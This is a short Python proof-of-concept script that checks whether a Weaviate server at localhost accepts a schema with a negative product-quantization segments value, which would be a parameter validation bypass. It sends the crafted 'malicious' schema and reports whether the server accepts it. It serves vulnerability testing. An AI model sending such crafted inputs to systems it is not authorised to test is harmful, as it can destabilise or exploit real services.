import requests
import sys

WEAVIATE_URL = "http://localhost:8080"
CLASS_NAME = "TestNegativeSegments"

def main():
    print("[*] Checking if Weaviate accepts negative PQ segments (parameter validation bypass)")

    # 清理可能存在的同名类
    requests.delete(f"{WEAVIATE_URL}/v1/schema/{CLASS_NAME}")

    # 恶意模式：segments = -128（本应被拒绝）
    malicious_schema = {
        "class": CLASS_NAME,
        "vectorizer": "none",
        "vectorIndexType": "hnsw",
        "vectorIndexConfig": {
            "pq": {
                "enabled": True,
                "segments": -128,          # 负数，应被验证拒绝
                "trainingLimit": 1
            }
        }
    }

    print("[*] Sending schema with negative segments...")
    try:
        res = requests.post(f"{WEAVIATE_URL}/v1/schema", json=malicious_schema, timeout=5)
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection error: {e}")
        sys.exit(1)

    # 检查结果
    if res.status_code == 200:
        print("[!] VULNERABILITY CONFIRMED: Negative segments were accepted!")
        print("[!] Parameter validation is missing or incorrect.")
        # 清理创建的类
        requests.delete(f"{WEAVIATE_URL}/v1/schema/{CLASS_NAME}")
    elif res.status_code == 400:
        print("[+] Negative segments correctly rejected (likely patched).")
    else:
        print(f"[-] Unexpected response: {res.status_code} - {res.text}")

if __name__ == "__main__":
    main()